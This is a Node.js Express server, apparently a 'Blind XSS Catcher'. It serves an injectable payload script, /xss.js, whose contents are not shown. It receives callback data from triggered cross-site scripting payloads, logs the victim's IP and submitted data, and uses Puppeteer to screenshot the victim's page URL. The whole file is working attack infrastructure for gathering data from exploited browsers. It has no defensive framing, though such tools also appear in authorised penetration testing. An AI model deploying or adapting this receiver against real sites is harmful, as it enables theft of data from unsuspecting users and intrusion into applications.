const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

// Serve payload script
app.get('/xss.js', (req, res) => {
  res.set('Content-Type', 'application/javascript');
  res.sendFile(__dirname + '/xss.js');
});

// Endpoint to receive the Blind XSS trigger data
app.post('/log', async (req, res) => {
  const data = req.body;
  console.log('Blind XSS triggered:');
  console.log('From IP:', req.ip);
  console.log('Data:', data);

  // Take screenshot of the victim URL using Puppeteer
  try {
    const browser = await puppeteer.launch({
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    await page.setUserAgent(data.userAgent || 'Unknown');
    await page.goto(data.url, { waitUntil: 'networkidle2', timeout: 15000 });

    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const filename = `screenshot-${timestamp}.png`;
    await page.screenshot({ path: filename, fullPage: true });

    await browser.close();

    console.log(`Screenshot saved: ${filename}`);
  } catch (e) {
    console.error('Screenshot error:', e.message);
  }

  res.sendStatus(200);
});

// Basic home route
app.get('/', (req, res) => {
  res.send('Blind XSS Catcher is running.');
});

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
